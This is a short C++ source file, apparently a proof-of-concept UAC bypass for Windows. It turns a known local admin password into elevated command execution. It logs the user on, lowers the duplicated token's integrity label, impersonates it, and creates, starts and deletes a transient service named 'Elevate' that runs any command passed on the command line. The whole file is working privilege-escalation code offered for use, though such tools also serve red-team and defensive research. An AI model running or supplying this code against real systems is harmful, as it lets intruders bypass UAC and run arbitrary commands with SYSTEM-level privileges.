//Small c++ code to create High IL from Medium IL when local admin password is known
//https://twitter.com/splinter_code/status/1457589164002643971
//Based on: https://github.com/diversenok/TokenUniverse
#include <Windows.h>
#include <stdio.h>
#include <sddl.h>
#pragma comment(lib,"Advapi32.lib")

HANDLE Login(wchar_t* username, wchar_t* password, wchar_t* domain) {
    HANDLE token = NULL;
    if (!LogonUserW(username, domain, password, LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &token)) {
        wprintf(L"ERROR[LogonUserw]: %d\n", GetLastError());
        exit(0);
    }
    return token;
}
HANDLE Downgrade(HANDLE token) {
    const wchar_t sid_string[] = L"S-1-16-8192";
    HANDLE dup_token = NULL;
    TOKEN_MANDATORY_LABEL integrity;
    PSID  sid = NULL;
    ConvertStringSidToSidW(sid_string, &sid);
    if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &dup_token)) {
        wprintf(L"ERROR[DuplicateToken]: %d\n", GetLastError());
        exit(0);
    }
    ZeroMemory(&integrity, sizeof(integrity));
    integrity.Label.Attributes = SE_GROUP_INTEGRITY;
    integrity.Label.Sid = sid;
    if (SetTokenInformation(dup_token, TokenIntegrityLevel, &integrity, sizeof(integrity) + GetLengthSid(sid)) == 0) {
        wprintf(L"ERROR[SetTokenInformation]: %d\n", GetLastError());
    }
    LocalFree(sid);
    return dup_token;
}
void Execute(HANDLE token,wchar_t* command) {
    if (ImpersonateLoggedOnUser(token)) {
        wprintf(L"User impersonated!\n");
        wprintf(L"Creating service.\n");
    }
    else
    {
        wprintf(L"ERROR[ImpersonateLoggedOnUser]: %d\n",GetLastError());
        exit(0);
    }
    SC_HANDLE scm = NULL, service = NULL;
    scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm == INVALID_HANDLE_VALUE) {
        wprintf(L"ERROR[OpenSCManager]: %d\n", GetLastError());
        exit(0);
    }
    
    service = CreateServiceW(scm, L"Elevate", L"Elevate", SC_MANAGER_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, 0, command, NULL, NULL, NULL, NULL, NULL);
    CloseServiceHandle(scm);
    if (service == NULL) {
        wprintf(L"ERROR[CreateService]: %d\n", GetLastError());
        exit(0);
    }
    if (StartServiceW(service, 0, NULL) == 0 && GetLastError() != 1053) {
        wprintf(L"ERROR[StartServiceW]: %d\n", GetLastError());
        CloseServiceHandle(service);
        exit(0);
    }
    Sleep(2000);
    wprintf(L"Command executed!\nDeleting service.\n");
    DeleteService(service);
    CloseServiceHandle(service);

}

int wmain(int argc, wchar_t* argv[])
{
    //Elevate.exe user password domain "command"
    Execute(Downgrade(Login(argv[1], argv[2], argv[3])), argv[4]);
}

